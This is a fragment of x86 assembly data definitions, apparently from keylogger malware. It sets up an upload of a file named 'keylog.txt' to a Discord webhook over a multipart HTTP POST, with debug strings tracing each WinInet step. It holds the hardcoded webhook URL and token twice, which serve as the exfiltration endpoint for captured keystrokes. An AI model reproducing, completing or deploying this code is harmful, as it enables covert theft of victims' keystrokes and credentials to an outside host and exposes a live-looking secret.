...
.data
    ...
    szUploader      db "Mozilla/5.0",0
    szDiscordHost   db "discord.com",0
    szWebhookURL    db "/api/webhooks/1363716470311485500/A2B2LxoNs_s4hxiNhDsBOiSS7JrpSbc1akfROL8i0wq1J1yhUMSCY_Rq503dbOy5Q04T",0
    szPostMethod    db "POST",0
    szAccept        db "*/*",0
    szContentType   db "Content-Type: multipart/form-data; boundary=------------------------boundaryKabeer",0
    szBoundary      db "------------------------boundaryKabeer",0
    
    ; Multipart form data headers and footers
    szFormHeader    db "--------------------------boundaryKabeer",13,10
                    db "Content-Disposition: form-data; name=""file""; filename=""keylog.txt""",13,10
                    db "Content-Type: text/plain",13,10,13,10,0
                    
    szFormFooter    db 13,10,"--------------------------boundaryKabeer--",13,10,0


    .data
    ; ... (your existing data definitions here)
    
    ; Debug dialog strings
    szDebugStart            db "Debug: Starting Upload", 0
    szDebugError            db "Debug: Error", 0
    szDebugInfo             db "Debug: Info", 0
    szDebugFileOpenFailed   db "Failed to open file. Error: %d", 0
    szDebugFileOpenSuccess  db "File opened successfully", 0
    szDebugFileSize         db "File size: %d bytes", 0
    szDebugReadFailed       db "Failed to read file. Error: %d", 0
    szDebugReadSuccess      db "Read %d bytes from file", 0
    szDebugInternetOpenFailed db "Failed to initialize WinInet. Error: %d", 0
    szDebugInternetOpenSuccess db "WinInet initialized successfully", 0
    szDebugConnecting       db "Connecting to discord.com, Port: %d, Secure: %d", 0
    szDebugConnectFailed    db "Failed to connect to server. Error: %d", 0
    szDebugConnectSuccess   db "Connected to server successfully", 0
    szDebugHttpRequest      db "Debug: Before HttpOpenRequest", 0
    szDebugHttpOpenFailed   db "Failed to open HTTP request. Error: %d", 0
    szDebugHttpOpenSuccess  db "HTTP request opened successfully", 0
    szDebugFormHeaderLen    db "Form header length: %d", 0
    szDebugContentLen       db "Form header + content length: %d", 0
    szDebugTotalLen         db "Total form data length: %d", 0
    szDebugBeforeSend       db "About to send HTTP request", 0
    szDebugSendFailed       db "Failed to send HTTP request. Error: %d", 0
    szDebugSendSuccess      db "HTTP request sent successfully", 0
    szDebugFormHeader       db "Debug: Form Header Content", 0
    szDebugWriteHeaderFailed db "Failed to write form header. Error: %d", 0
    szDebugWriteHeaderSuccess db "Wrote %d bytes of form header", 0
    szDebugBeforeWriteFile  db "About to write %d bytes of file data", 0
    szDebugWriteContentFailed db "Failed to write file content. Error: %d", 0
    szDebugWriteContentSuccess db "Wrote %d bytes of file content", 0
    szDebugFormFooter       db "Debug: Form Footer Content", 0
    szDebugWriteFooterFailed db "Failed to write form footer. Error: %d", 0
    szDebugWriteFooterSuccess db "Wrote %d bytes of form footer", 0
    szDebugUploadComplete   db "Upload completed successfully", 0
    ...
    szWebhookPath  db "/api/webhooks/1363716470311485500/A2B2LxoNs_s4hxiNhDsBOiSS7JrpSbc1akfROL8i0wq1J1yhUMSCY_Rq503dbOy5Q04T",0
